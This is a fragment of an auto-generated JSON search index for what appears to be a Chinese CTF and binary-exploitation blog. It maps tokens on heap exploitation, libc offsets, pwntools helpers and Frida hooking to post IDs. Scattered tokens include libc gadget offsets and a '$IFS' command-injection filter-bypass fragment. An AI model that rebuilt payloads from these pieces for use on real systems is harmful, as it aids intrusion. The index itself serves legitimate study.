[\"lea\",{\"1\":{\"473\":1}}],[\"leave^key\",{\"1\":{\"503\":1}}],[\"leave\",{\"1\":{\"503\":3}}],[\"leave指令\",{\"1\":{\"446\":1}}],[\"leave|ret\",{\"1\":{\"445\":1}}],[\"leaver\",{\"1\":{\"127\":1}}],[\"leak\",{\"0\":{\"361\":1}}],[\"leak出来我们的libc地址\",{\"1\":{\"302\":1}}],[\"least\",{\"1\":{\"324\":1}}],[\"learnku\",{\"1\":{\"253\":1}}],[\"learn\",{\"1\":{\"53\":1,\"193\":1}}],[\"l\",{\"1\":{\"118\":1,\"131\":2,\"408\":1,\"485\":1}}],[\"ld当前绑定地址\",{\"1\":{\"455\":1}}],[\"ldd\",{\"1\":{\"455\":2}}],[\"ld的作用\",{\"1\":{\"454\":1}}],[\"ld的链接\",{\"0\":{\"96\":1,\"236\":1}}],[\"ld\",{\"0\":{\"456\":1},\"1\":{\"452\":2,\"453\":1,\"456\":1,\"485\":1}}],[\"ldr\",{\"1\":{\"47\":1,\"187\":1}}],[\"la13x\",{\"1\":{\"398\":1}}],[\"lambda\",{\"1\":{\"369\":11,\"473\":11,\"475\":11,\"479\":11,\"480\":11,\"481\":11,\"482\":11,\"483\":11,\"484\":11,\"486\":11,\"488\":11,\"491\":11,\"503\":11,\"504\":11,\"505\":11}}],[\"last\",{\"1\":{\"305\":1,\"321\":1,\"347\":1,\"390\":1,\"408\":2}}],[\"launcher主要和action中的android\",{\"1\":{\"143\":1}}],[\"lang\",{\"1\":{\"125\":1,\"134\":3}}],[\"larger\",{\"1\":{\"352\":1}}],[\"largechunk中最大的chunk还是小于我们所需求的chunk大小这种情况\",{\"1\":{\"325\":1}}],[\"large最终入bin操作\",{\"0\":{\"317\":1}}],[\"largebin等\",{\"1\":{\"347\":1}}],[\"largebin第一个chunk和头的互锁状态\",{\"1\":{\"321\":1}}],[\"largebin中有chunk\",{\"1\":{\"321\":1}}],[\"largebin情况\",{\"1\":{\"320\":1}}],[\"largebin还有chunk\",{\"1\":{\"317\":1}}],[\"largebin\",{\"0\":{\"57\":1,\"197\":1,\"308\":1,\"319\":1},\"1\":{\"308\":1,\"319\":3,\"325\":1}}],[\"large\",{\"0\":{\"307\":1},\"1\":{\"50\":1,\"190\":1,\"307\":1,\"308\":1,\"324\":2,\"352\":1,\"353\":2,\"438\":2}}],[\"layout\",{\"1\":{\"0\":2,\"74\":1,\"214\":1}}],[\"lockp函数的利用\",{\"1\":{\"421\":1}}],[\"lockp\",{\"0\":{\"423\":1},\"1\":{\"384\":1}}],[\"locked\",{\"1\":{\"339\":3,\"403\":3,\"407\":3}}],[\"lock\",{\"1\":{\"324\":16,\"339\":8,\"347\":3,\"349\":12,\"351\":5,\"353\":16,\"403\":3,\"407\":2,\"408\":3,\"417\":1}}],[\"local\",{\"1\":{\"131\":1,\"369\":2}}],[\"location\",{\"1\":{\"131\":1}}],[\"long\",{\"1\":{\"313\":2,\"319\":5,\"321\":4,\"324\":6,\"353\":2,\"404\":6,\"464\":3}}],[\"lore学习\",{\"0\":{\"304\":1}}],[\"low\",{\"1\":{\"286\":1}}],[\"loop\",{\"1\":{\"279\":1,\"483\":4}}],[\"loss\",{\"1\":{\"261\":1}}],[\"logger\",{\"1\":{\"125\":1}}],[\"log\",{\"1\":{\"121\":1,\"123\":2,\"125\":3,\"126\":3,\"127\":2,\"131\":3,\"369\":1,\"473\":1,\"475\":2,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":2,\"485\":1,\"486\":2,\"488\":2,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"load\",{\"1\":{\"47\":1,\"118\":1,\"187\":1,\"324\":1}}],[\"love\",{\"1\":{\"1\":1}}],[\"lru算法\",{\"1\":{\"68\":1,\"208\":1}}],[\"lr\",{\"1\":{\"47\":1,\"187\":1}}],[\"lr链接寄存器\",{\"1\":{\"47\":1,\"187\":1}}],[\"lgd\",{\"1\":{\"40\":1,\"180\":1}}],[\"limit\",{\"1\":{\"352\":7}}],[\"lightweight\",{\"1\":{\"324\":1}}],[\"little\",{\"1\":{\"324\":1,\"469\":1,\"475\":1,\"484\":1,\"485\":1,\"486\":1,\"488\":1}}],[\"list使用情况\",{\"1\":{\"491\":1}}],[\"list的利用详解\",{\"1\":{\"372\":1,\"494\":1}}],[\"list上的分配区结构\",{\"1\":{\"353\":1}}],[\"listen\",{\"1\":{\"279\":4}}],[\"list\",{\"1\":{\"134\":1,\"286\":1,\"296\":1,\"305\":1,\"312\":1,\"319\":2,\"321\":2,\"324\":1,\"325\":1,\"344\":2,\"345\":1,\"347\":6,\"349\":7,\"352\":1,\"353\":13,\"377\":2,\"384\":1,\"389\":1,\"403\":4,\"408\":1,\"410\":1,\"417\":4,\"422\":1,\"438\":2,\"491\":5,\"499\":2,\"503\":4}}],[\"lib中寻找\",{\"1\":{\"453\":1}}],[\"lib寻找\",{\"1\":{\"453\":1}}],[\"libray\",{\"1\":{\"453\":1}}],[\"library\",{\"1\":{\"453\":1}}],[\"libraries里面开新的空间\",{\"1\":{\"327\":1}}],[\"libary\",{\"1\":{\"453\":3}}],[\"libio\",{\"1\":{\"395\":3}}],[\"lib\",{\"1\":{\"127\":1,\"456\":1}}],[\"libnative\",{\"1\":{\"127\":1}}],[\"libc+0x35732\",{\"1\":{\"503\":1}}],[\"libc+0x2be51\",{\"1\":{\"503\":1}}],[\"libc+0x2a3e5\",{\"1\":{\"503\":1}}],[\"libc+0x133bea\",{\"1\":{\"503\":1}}],[\"libc+0x119170\",{\"1\":{\"503\":1}}],[\"libc+0x11f2e7\",{\"1\":{\"503\":1}}],[\"libc+0x1147d0\",{\"1\":{\"503\":1}}],[\"libc+0x1144e0\",{\"1\":{\"503\":1}}],[\"libc+0x114870\",{\"1\":{\"503\":1}}],[\"libc+0x1ecb70\",{\"1\":{\"488\":1}}],[\"libc就是ldd查到的那个ld地址\",{\"1\":{\"456\":1}}],[\"libc2\",{\"0\":{\"427\":1,\"429\":1}}],[\"libc地址\",{\"1\":{\"383\":1}}],[\"libc的操作\",{\"1\":{\"361\":1}}],[\"libc操作复现\",{\"0\":{\"361\":1}}],[\"libc版本2\",{\"1\":{\"355\":1,\"361\":1}}],[\"libc都没实现\",{\"1\":{\"299\":1}}],[\"libc基地址0x7f566bb4f000=偏移0x3ac78\",{\"1\":{\"287\":1}}],[\"libc\",{\"0\":{\"423\":1,\"456\":1},\"1\":{\"257\":3,\"324\":4,\"342\":1,\"347\":1,\"349\":5,\"350\":1,\"351\":5,\"353\":7,\"369\":4,\"373\":1,\"380\":4,\"397\":5,\"422\":1,\"423\":1,\"428\":6,\"456\":4,\"473\":2,\"475\":5,\"479\":8,\"488\":10,\"491\":4,\"495\":1,\"502\":4,\"503\":13}}],[\"libcbaseaddr\",{\"1\":{\"127\":1}}],[\"libc执行abort\",{\"1\":{\"60\":1,\"200\":1}}],[\"license\",{\"0\":{\"112\":1}}],[\"linc\",{\"1\":{\"257\":1}}],[\"line=\",{\"1\":{\"467\":1}}],[\"lines=\",{\"1\":{\"464\":1}}],[\"lines\",{\"1\":{\"464\":1}}],[\"line\",{\"1\":{\"60\":2,\"200\":2,\"439\":4,\"441\":4,\"464\":1}}],[\"linking\",{\"1\":{\"324\":2}}],[\"linked\",{\"1\":{\"286\":1,\"296\":1,\"305\":1,\"312\":1,\"319\":2,\"325\":1,\"344\":2,\"345\":1,\"347\":3,\"417\":2}}],[\"link\",{\"0\":{\"504\":1},\"1\":{\"36\":1,\"176\":1,\"324\":1,\"339\":1,\"403\":1,\"417\":3,\"449\":1,\"450\":1,\"504\":1}}],[\"linux中常用的指令\",{\"0\":{\"464\":1}}],[\"linux程序加载简化流程\",{\"0\":{\"454\":1}}],[\"linux下程序的加载\",{\"1\":{\"452\":1}}],[\"linux动态链接库的加载顺序\",{\"1\":{\"452\":1}}],[\"linux的内存管理\",{\"0\":{\"70\":1,\"210\":1}}],[\"linux2\",{\"1\":{\"41\":1,\"181\":1}}],[\"linux等文件管理系统采用了cow策略\",{\"1\":{\"9\":1,\"151\":1}}],[\"linux\",{\"0\":{\"5\":1,\"62\":1,\"72\":1,\"148\":1,\"202\":1,\"212\":1,\"518\":1},\"1\":{\"15\":1,\"41\":1,\"73\":1,\"74\":1,\"79\":1,\"157\":1,\"181\":1,\"213\":1,\"214\":1,\"219\":1,\"369\":2,\"452\":1,\"456\":1,\"473\":2,\"475\":3,\"479\":2,\"480\":2,\"481\":2,\"482\":2,\"483\":1,\"484\":3,\"485\":2,\"486\":2,\"488\":3,\"491\":2,\"503\":2,\"504\":2,\"505\":2}}],[\"lies\",{\"1\":{\"1\":1}}],[\"life\",{\"1\":{\"1\":1}}],[\"碇シンジ\",{\"1\":{\"1\":1}}],[\"1u\",{\"1\":{\"459\":1}}],[\"1存的就是link\",{\"1\":{\"449\":1}}],[\"1l\",{\"1\":{\"410\":1}}],[\"1a10\",{\"1\":{\"365\":1,\"369\":1}}],[\"1c7036f\",{\"1\":{\"274\":1}}],[\"14\",{\"1\":{\"261\":1,\"376\":3,\"377\":1,\"378\":1,\"380\":4,\"461\":1,\"473\":2,\"488\":3,\"491\":2,\"498\":3,\"499\":1,\"500\":1,\"502\":4,\"503\":18}}],[\"144\",{\"1\":{\"1\":1}}],[\"18h\",{\"1\":{\"459\":1}}],[\"187\",{\"1\":{\"261\":4}}],[\"18\",{\"1\":{\"258\":1,\"461\":1,\"488\":2}}],[\"19\",{\"1\":{\"408\":1,\"461\":1,\"488\":2}}],[\"1936\",{\"1\":{\"373\":1,\"495\":1}}],[\"194\",{\"1\":{\"261\":5}}],[\"19docke\",{\"1\":{\"257\":1}}],[\"1987年首次公布\",{\"1\":{\"238\":1}}],[\"1111\",{\"1\":{\"475\":1,\"482\":1}}],[\"11$p\",{\"1\":{\"473\":1}}],[\"11\",{\"1\":{\"378\":2,\"380\":2,\"461\":1,\"469\":2,\"470\":2,\"475\":1,\"488\":2,\"500\":2,\"502\":2,\"503\":1}}],[\"1150\",{\"1\":{\"365\":1,\"369\":1}}],[\"11个\",{\"1\":{\"302\":1}}],[\"113\",{\"1\":{\"261\":5}}],[\"112\",{\"1\":{\"255\":1}}],[\"114514\",{\"1\":{\"491\":1,\"503\":1}}],[\"11451\",{\"1\":{\"131\":4}}],[\"114645082\",{\"1\":{\"14\":1,\"156\":1}}],[\"114\",{\"1\":{\"1\":1}}],[\"15e0\",{\"1\":{\"365\":1,\"369\":1}}],[\"15\",{\"1\":{\"255\":1,\"261\":1,\"389\":1,\"461\":1,\"479\":1,\"488\":3,\"491\":1,\"503\":1}}],[\"15705033\",{\"1\":{\"15\":1,\"157\":1}}],[\"10432\",{\"1\":{\"503\":1}}],[\"1040\",{\"1\":{\"365\":1,\"369\":1}}],[\"10a\",{\"1\":{\"491\":1}}],[\"10个chunk\",{\"1\":{\"358\":1}}],[\"100\",{\"1\":{\"342\":1,\"431\":2,\"464\":2,\"483\":1}}],[\"1000\",{\"1\":{\"69\":3,\"209\":3}}],[\"10\",{\"1\":{\"292\":2,\"358\":1,\"359\":1,\"461\":1,\"475\":3,\"488\":2,\"503\":5,\"505\":1}}],[\"1024\",{\"1\":{\"254\":2}}],[\"105780625\",{\"1\":{\"244\":1}}],[\"1216\",{\"1\":{\"488\":1}}],[\"128\",{\"1\":{\"373\":1,\"376\":2,\"380\":2,\"473\":1,\"495\":1,\"498\":2,\"502\":2,\"503\":15}}],[\"128m\",{\"1\":{\"73\":1,\"213\":1}}],[\"128mb\",{\"1\":{\"70\":1,\"210\":1}}],[\"12\",{\"1\":{\"292\":2,\"461\":1,\"475\":1,\"491\":3,\"503\":2}}],[\"12345\",{\"1\":{\"485\":1}}],[\"123\",{\"1\":{\"266\":1}}],[\"1290068\",{\"1\":{\"263\":1}}],[\"120\",{\"1\":{\"261\":5}}],[\"127\",{\"1\":{\"131\":4,\"473\":1,\"479\":1,\"485\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"505\":1}}],[\"1t虚拟内存映射区\",{\"1\":{\"70\":1,\"210\":1}}],[\"16+p64\",{\"1\":{\"488\":1}}],[\"16+fakechunk\",{\"1\":{\"377\":1,\"499\":1}}],[\"16\",{\"1\":{\"47\":1,\"50\":1,\"127\":1,\"131\":1,\"187\":1,\"190\":1,\"258\":1,\"290\":1,\"292\":3,\"378\":1,\"380\":2,\"461\":1,\"473\":2,\"475\":2,\"479\":1,\"488\":2,\"491\":1,\"500\":1,\"502\":2,\"503\":4}}],[\"17696ms\",{\"1\":{\"261\":1}}],[\"1781093\",{\"1\":{\"140\":1}}],[\"17\",{\"1\":{\"41\":1,\"181\":1,\"461\":1,\"488\":2}}],[\"1>也就是标准输出流定向到某个文件种\",{\"1\":{\"18\":1,\"160\":1}}],[\"1是标准输出\",{\"1\":{\"15\":2,\"157\":2}}],[\"1表示写入\",{\"1\":{\"13\":1,\"155\":1}}],[\"1\",{\"0\":{\"341\":1,\"355\":1},\"1\":{\"13\":1,\"30\":7,\"36\":2,\"40\":2,\"47\":1,\"50\":1,\"52\":2,\"63\":1,\"66\":1,\"126\":2,\"131\":6,\"137\":1,\"140\":2,\"155\":1,\"172\":7,\"176\":2,\"180\":2,\"187\":1,\"190\":1,\"192\":2,\"203\":1,\"206\":1,\"240\":6,\"241\":2,\"242\":3,\"243\":3,\"252\":1,\"261\":1,\"282\":1,\"290\":1,\"315\":1,\"339\":1,\"342\":1,\"347\":1,\"352\":4,\"353\":3,\"358\":1,\"359\":1,\"365\":1,\"369\":4,\"377\":1,\"380\":1,\"382\":1,\"390\":1,\"397\":10,\"404\":1,\"408\":1,\"417\":5,\"420\":1,\"436\":1,\"449\":4,\"459\":1,\"460\":3,\"461\":11,\"462\":9,\"464\":1,\"473\":1,\"475\":1,\"479\":2,\"480\":1,\"481\":1,\"483\":3,\"484\":3,\"485\":1,\"486\":1,\"488\":4,\"491\":4,\"499\":1,\"502\":1,\"503\":8,\"505\":1}}],[\"13$s\",{\"1\":{\"479\":2}}],[\"13\",{\"1\":{\"380\":2,\"461\":1,\"491\":2,\"502\":2,\"503\":3}}],[\"135mb\",{\"1\":{\"258\":1}}],[\"138\",{\"1\":{\"1\":1}}],[\"132\",{\"1\":{\"1\":1}}],[\"hgame\",{\"0\":{\"522\":1}}],[\"hgameweek2babyre\",{\"0\":{\"457\":1}}],[\"hgame的week3的一道题\",{\"1\":{\"355\":1}}],[\"hilite\",{\"1\":{\"464\":1}}],[\"hi\",{\"1\":{\"404\":1}}],[\"high\",{\"1\":{\"324\":1,\"380\":2,\"502\":2,\"503\":1}}],[\"hitcon\",{\"0\":{\"283\":1}}],[\"h>\",{\"1\":{\"290\":2,\"397\":5,\"404\":2,\"458\":1,\"462\":1,\"470\":1}}],[\"has\",{\"1\":{\"324\":1}}],[\"have\",{\"1\":{\"286\":1,\"321\":2,\"324\":10,\"339\":8,\"347\":1,\"352\":1,\"353\":1,\"480\":1}}],[\"happend\",{\"1\":{\"279\":2}}],[\"handle\",{\"1\":{\"417\":1}}],[\"handler\",{\"1\":{\"126\":1,\"131\":1,\"252\":2,\"254\":1,\"459\":1,\"461\":1}}],[\"handshaketimeout\",{\"1\":{\"254\":1}}],[\"hhh后面找到个类似的解决的文章\",{\"1\":{\"261\":1}}],[\"h\",{\"1\":{\"131\":2,\"353\":12,\"369\":1,\"431\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"485\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"how\",{\"1\":{\"369\":1}}],[\"however\",{\"1\":{\"342\":1}}],[\"hook地址写入栈\",{\"0\":{\"477\":1}}],[\"hooking\",{\"1\":{\"134\":3,\"136\":1}}],[\"hook无导出函数\",{\"1\":{\"127\":1}}],[\"hook构造函数\",{\"1\":{\"124\":1}}],[\"hook构造方法\",{\"0\":{\"124\":1}}],[\"hooktest9\",{\"1\":{\"127\":1}}],[\"hooktest6\",{\"1\":{\"126\":1}}],[\"hooktest4\",{\"1\":{\"125\":1}}],[\"hooktest3\",{\"1\":{\"124\":1}}],[\"hooktest2\",{\"1\":{\"123\":1}}],[\"hooktest1\",{\"1\":{\"123\":1}}],[\"hook所有重载函数\",{\"1\":{\"123\":1}}],[\"hook重载方法\",{\"1\":{\"123\":1}}],[\"hook重载函数\",{\"0\":{\"123\":1}}],[\"hookdemo01\",{\"1\":{\"121\":1,\"123\":2,\"124\":1,\"125\":2,\"126\":2}}],[\"hook\",{\"0\":{\"117\":1,\"127\":1,\"131\":1},\"1\":{\"121\":1,\"123\":1,\"127\":2,\"131\":2,\"134\":1,\"474\":1,\"475\":7,\"476\":1,\"479\":7,\"488\":2}}],[\"hook相关\",{\"0\":{\"116\":1}}],[\"house\",{\"0\":{\"56\":1,\"59\":1,\"60\":1,\"196\":1,\"199\":1,\"200\":1,\"304\":1,\"381\":1,\"384\":1,\"393\":1},\"1\":{\"382\":3,\"393\":1,\"397\":1}}],[\"house系列主要是这个glibc堆利用之house\",{\"1\":{\"53\":1,\"193\":1}}],[\"homepage\",{\"1\":{\"0\":1}}],[\"home\",{\"0\":{\"0\":1},\"1\":{\"0\":2,\"131\":1,\"469\":1}}],[\"hurt\",{\"1\":{\"324\":1}}],[\"hub我们只需要根据ubuntu的版本\",{\"1\":{\"262\":1}}],[\"huge的分配\",{\"1\":{\"438\":1}}],[\"huge\",{\"1\":{\"50\":1,\"190\":1,\"438\":3}}],[\"huawei\",{\"1\":{\"8\":1,\"150\":1}}],[\"html\",{\"1\":{\"15\":1,\"140\":1,\"157\":1}}],[\"https\",{\"1\":{\"1\":1,\"10\":1,\"13\":1,\"14\":1,\"15\":1,\"40\":2,\"46\":1,\"49\":1,\"131\":1,\"140\":2,\"152\":1,\"155\":1,\"156\":1,\"157\":1,\"180\":2,\"186\":1,\"189\":1,\"244\":1,\"255\":1,\"263\":1,\"331\":1,\"437\":1}}],[\"http\",{\"1\":{\"1\":2,\"254\":10,\"258\":2,\"261\":7}}],[\"hex\",{\"1\":{\"358\":2,\"359\":2,\"380\":12,\"470\":1,\"473\":2,\"475\":5,\"479\":7,\"481\":1,\"486\":1,\"488\":8,\"491\":4,\"502\":12,\"503\":21,\"505\":1}}],[\"hexo\",{\"1\":{\"1\":1}}],[\"heapbase\",{\"1\":{\"491\":1}}],[\"heap结构\",{\"1\":{\"438\":1}}],[\"heap是内存池的一个结构\",{\"1\":{\"438\":1}}],[\"heap是仅仅在非主分配区使用的\",{\"1\":{\"353\":1}}],[\"heap相关学习\",{\"0\":{\"438\":1}}],[\"heap+0xba0\",{\"1\":{\"503\":1}}],[\"heap+0xb20+0x10\",{\"1\":{\"503\":1}}],[\"heap+0xf40\",{\"1\":{\"503\":1}}],[\"heap+0x1390\",{\"1\":{\"503\":1}}],[\"heap+0x1398\",{\"1\":{\"503\":1}}],[\"heap+0x42260\",{\"1\":{\"503\":1}}],[\"heap+0x42050+0x10\",{\"1\":{\"503\":1}}],[\"heap+0x42420\",{\"1\":{\"380\":1,\"502\":1}}],[\"heap+0xd10\",{\"1\":{\"491\":1}}],[\"heap+5664\",{\"1\":{\"488\":1}}],[\"heap+5696\",{\"1\":{\"488\":2}}],[\"heap+271376+0x10\",{\"1\":{\"380\":1,\"502\":1}}],[\"heap会因为我们消耗topchunk一次而发生细微的改变\",{\"1\":{\"378\":1,\"500\":1}}],[\"heap>>12^0x404070\",{\"1\":{\"491\":1}}],[\"heap>>12\",{\"1\":{\"378\":1,\"500\":1}}],[\"heap地址\",{\"1\":{\"372\":1,\"494\":1}}],[\"heap可以查看当前的chunk\",{\"1\":{\"297\":1}}],[\"heap\",{\"0\":{\"373\":1,\"495\":1,\"516\":1},\"1\":{\"287\":1,\"295\":1,\"324\":8,\"353\":5,\"373\":1,\"380\":4,\"438\":5,\"439\":15,\"441\":10,\"442\":5,\"488\":10,\"491\":3,\"495\":1,\"502\":4,\"503\":6}}],[\"head来实现劫持\",{\"1\":{\"488\":1}}],[\"head来绕过新版本的检查机制\",{\"1\":{\"361\":1}}],[\"head$ifs$1flag\",{\"1\":{\"468\":1}}],[\"head命令\",{\"1\":{\"464\":1}}],[\"head头\",{\"1\":{\"365\":1,\"369\":1}}],[\"header\",{\"0\":{\"365\":1}}],[\"header返回header对象\",{\"1\":{\"254\":1}}],[\"head\",{\"1\":{\"313\":2,\"321\":2,\"324\":2,\"337\":1,\"353\":1,\"464\":4,\"490\":2}}],[\"head即可\",{\"1\":{\"276\":1}}],[\"hence\",{\"1\":{\"286\":1,\"417\":1}}],[\"help\",{\"1\":{\"131\":2,\"464\":1}}],[\"helper\",{\"1\":{\"59\":3,\"199\":3}}],[\"hello\",{\"0\":{\"481\":1},\"1\":{\"125\":1}}],[\"heygap\",{\"1\":{\"40\":2,\"180\":2}}],[\"here\",{\"1\":{\"1\":1,\"321\":1,\"324\":1,\"342\":1}}],[\"沉淀\",{\"1\":{\"1\":1}}],[\"友情链接\",{\"0\":{\"1\":1}}],[\"p=\",{\"1\":{\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"485\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"p2\",{\"1\":{\"397\":4}}],[\"pbackfail\",{\"1\":{\"395\":9,\"401\":2}}],[\"p1\",{\"1\":{\"397\":5}}],[\"p16\",{\"1\":{\"365\":1,\"369\":1}}],[\"p1kk\",{\"1\":{\"49\":2,\"189\":2}}],[\"p64\",{\"1\":{\"358\":10,\"359\":10,\"367\":1,\"368\":1,\"369\":2,\"377\":5,\"378\":2,\"380\":2,\"473\":7,\"475\":6,\"480\":1,\"481\":1,\"488\":1,\"491\":1,\"499\":5,\"500\":2,\"502\":2,\"503\":16,\"504\":6,\"505\":3}}],[\"p入unsortedbin链\",{\"1\":{\"324\":1}}],[\"p位置\",{\"1\":{\"324\":1}}],[\"p为0\",{\"1\":{\"321\":1}}],[\"png\",{\"1\":{\"273\":1}}],[\"peak\",{\"1\":{\"438\":2,\"439\":2,\"441\":2}}],[\"perturb\",{\"1\":{\"305\":1,\"313\":1,\"315\":1,\"322\":1,\"324\":2,\"339\":1}}],[\"perthread\",{\"1\":{\"286\":5,\"338\":1}}],[\"per\",{\"1\":{\"286\":1}}],[\"performed\",{\"1\":{\"324\":1}}],[\"performance\",{\"1\":{\"286\":1,\"324\":1}}],[\"perform\",{\"1\":{\"120\":1,\"121\":1,\"131\":1,\"321\":1}}],[\"pem\",{\"1\":{\"243\":2}}],[\"phi\",{\"1\":{\"240\":1,\"241\":3,\"242\":1,\"243\":5}}],[\"php扩展学习\",{\"0\":{\"437\":1}}],[\"php堆开发简介\",{\"1\":{\"436\":1}}],[\"php\",{\"0\":{\"436\":1,\"519\":1},\"1\":{\"437\":2}}],[\"php内存管理中有三种颗粒度的内存块\",{\"1\":{\"50\":1,\"190\":1}}],[\"php中针对内存的操作进行了一层封装\",{\"1\":{\"50\":1,\"190\":1}}],[\"php7内核剖析\",{\"1\":{\"50\":1,\"190\":1,\"436\":1,\"437\":1}}],[\"phppwn堆管理机制\",{\"0\":{\"50\":1,\"190\":1}}],[\"ps\",{\"1\":{\"115\":1,\"258\":1}}],[\"putback+get\",{\"1\":{\"390\":1,\"408\":1}}],[\"put\",{\"1\":{\"315\":1,\"324\":1,\"342\":1,\"390\":3,\"397\":1,\"408\":3}}],[\"puts函数\",{\"1\":{\"483\":1}}],[\"puts\",{\"0\":{\"61\":1,\"201\":1},\"1\":{\"397\":14,\"469\":2}}],[\"pull\",{\"0\":{\"260\":1},\"1\":{\"258\":1,\"260\":1}}],[\"pub求解明文\",{\"1\":{\"243\":1}}],[\"pubkey\",{\"1\":{\"243\":1}}],[\"public\",{\"1\":{\"123\":5,\"124\":4,\"125\":6}}],[\"pushq\",{\"1\":{\"449\":3}}],[\"push\",{\"1\":{\"47\":1,\"187\":1,\"449\":2,\"483\":9}}],[\"push等栈传递\",{\"1\":{\"42\":1,\"182\":1}}],[\"port\",{\"1\":{\"473\":2,\"475\":2,\"479\":2,\"480\":2,\"481\":2,\"482\":2,\"483\":2,\"484\":2,\"485\":2,\"486\":2,\"488\":2,\"491\":2,\"503\":2,\"504\":2,\"505\":2}}],[\"ports\",{\"1\":{\"258\":1}}],[\"pos\",{\"1\":{\"417\":1}}],[\"position\",{\"1\":{\"417\":2}}],[\"positive\",{\"1\":{\"324\":1,\"339\":1}}],[\"posix\",{\"1\":{\"417\":1,\"458\":1}}],[\"possibility\",{\"1\":{\"352\":1}}],[\"possibly\",{\"1\":{\"324\":1}}],[\"posts\",{\"0\":{\"506\":1}}],[\"post\",{\"1\":{\"258\":1,\"460\":2}}],[\"postgresql\",{\"0\":{\"102\":1}}],[\"point指向的就是内容chunk\",{\"1\":{\"374\":1,\"496\":1}}],[\"pointer\",{\"1\":{\"324\":1,\"390\":5,\"408\":5,\"428\":2}}],[\"point\",{\"1\":{\"292\":4,\"324\":1,\"339\":1,\"374\":1,\"496\":1}}],[\"popq\",{\"1\":{\"449\":3}}],[\"pop操作我们的rsp向下移动一格\",{\"1\":{\"446\":1}}],[\"pop\",{\"1\":{\"47\":1,\"187\":1,\"446\":3,\"473\":2,\"483\":4,\"503\":6,\"504\":3}}],[\"poll\",{\"1\":{\"43\":1,\"183\":1,\"279\":1}}],[\"pc查询手机的进程\",{\"0\":{\"115\":1}}],[\"pcb通常是相同状态的链表链接在一起的\",{\"1\":{\"66\":1,\"206\":1}}],[\"pc存入lr\",{\"1\":{\"47\":1,\"187\":1}}],[\"pc\",{\"1\":{\"47\":3,\"187\":3}}],[\"pthreads\",{\"1\":{\"458\":1}}],[\"pthread\",{\"1\":{\"458\":11,\"459\":9,\"460\":1}}],[\"ptr会逐渐增加\",{\"1\":{\"426\":1}}],[\"ptr=\",{\"1\":{\"404\":1}}],[\"ptr的值设置成mstate的分配区状态机的数据结构\",{\"1\":{\"353\":1}}],[\"ptr\",{\"1\":{\"127\":2,\"324\":2,\"351\":13,\"353\":7,\"358\":4,\"359\":4,\"378\":1,\"390\":2,\"397\":1,\"404\":4,\"408\":6,\"410\":2,\"426\":4,\"428\":2,\"439\":3,\"442\":3,\"500\":1}}],[\"ptrace\",{\"1\":{\"40\":1,\"180\":1}}],[\"ptmp的做题记录\",{\"0\":{\"370\":1}}],[\"ptmx\",{\"1\":{\"79\":1,\"219\":1}}],[\"ptmalloc2\",{\"0\":{\"489\":1,\"492\":1,\"503\":1}}],[\"ptmalloc中用主分配区和非主分配区用来解决线程争夺问题\",{\"1\":{\"347\":1}}],[\"ptmalloc通过malloc\",{\"1\":{\"347\":1}}],[\"ptmalloc源码分析\",{\"1\":{\"346\":3}}],[\"ptmalloc主arena存在的意义\",{\"1\":{\"346\":1}}],[\"ptmalloc堆概述\",{\"1\":{\"346\":1}}],[\"ptmalloc\",{\"0\":{\"346\":1},\"1\":{\"53\":1,\"193\":1}}],[\"ptctl还可以让内核进入严格模式\",{\"1\":{\"41\":1,\"181\":1}}],[\"prctl\",{\"1\":{\"333\":1}}],[\"pr\",{\"1\":{\"270\":2}}],[\"prefix\",{\"1\":{\"485\":1}}],[\"predictable\",{\"1\":{\"410\":1}}],[\"present\",{\"1\":{\"353\":1}}],[\"previous\",{\"1\":{\"324\":1,\"353\":3}}],[\"prevsize\",{\"1\":{\"324\":4}}],[\"prev\",{\"1\":{\"290\":1,\"296\":2,\"311\":1,\"312\":3,\"313\":2,\"321\":2,\"324\":6,\"329\":2,\"344\":2,\"345\":4,\"353\":1,\"358\":6,\"359\":6,\"377\":2,\"438\":1,\"488\":1,\"491\":2,\"499\":2}}],[\"prevention\",{\"1\":{\"74\":2,\"214\":2}}],[\"prep\",{\"1\":{\"43\":4,\"183\":4}}],[\"pro\",{\"0\":{\"492\":1}}],[\"prompt\",{\"1\":{\"464\":2}}],[\"promise\",{\"1\":{\"278\":1}}],[\"proversion\",{\"1\":{\"463\":1}}],[\"provided\",{\"1\":{\"391\":1}}],[\"proper\",{\"1\":{\"353\":1}}],[\"proposed\",{\"1\":{\"261\":1}}],[\"probe\",{\"1\":{\"342\":1,\"351\":1,\"353\":1}}],[\"protocol\",{\"1\":{\"433\":1}}],[\"prototype\",{\"1\":{\"84\":2,\"224\":2}}],[\"protect\",{\"1\":{\"378\":1,\"500\":1}}],[\"protector又名canary\",{\"1\":{\"74\":1,\"214\":1}}],[\"protector\",{\"1\":{\"74\":1,\"214\":1}}],[\"progname\",{\"1\":{\"60\":2,\"200\":2}}],[\"process\",{\"1\":{\"279\":2,\"358\":1,\"359\":1,\"428\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"485\":2,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"proc\",{\"1\":{\"41\":1,\"69\":1,\"181\":1,\"209\":1}}],[\"prime\",{\"1\":{\"240\":1}}],[\"printerr\",{\"1\":{\"296\":2,\"305\":1,\"312\":5,\"319\":2,\"321\":1,\"324\":11,\"325\":1,\"342\":1,\"344\":3,\"345\":2,\"378\":1,\"500\":1}}],[\"printemo是根据emo\",{\"1\":{\"293\":1}}],[\"printstudent\",{\"1\":{\"125\":1}}],[\"print\",{\"1\":{\"124\":1,\"243\":2,\"281\":6,\"333\":1,\"358\":12,\"359\":11,\"369\":6,\"380\":12,\"461\":1,\"463\":2,\"470\":1,\"471\":1,\"473\":2,\"475\":13,\"479\":7,\"480\":1,\"481\":2,\"483\":2,\"484\":1,\"486\":2,\"488\":11,\"491\":10,\"502\":12,\"503\":18,\"505\":2}}],[\"printf\",{\"0\":{\"61\":1,\"201\":1},\"1\":{\"254\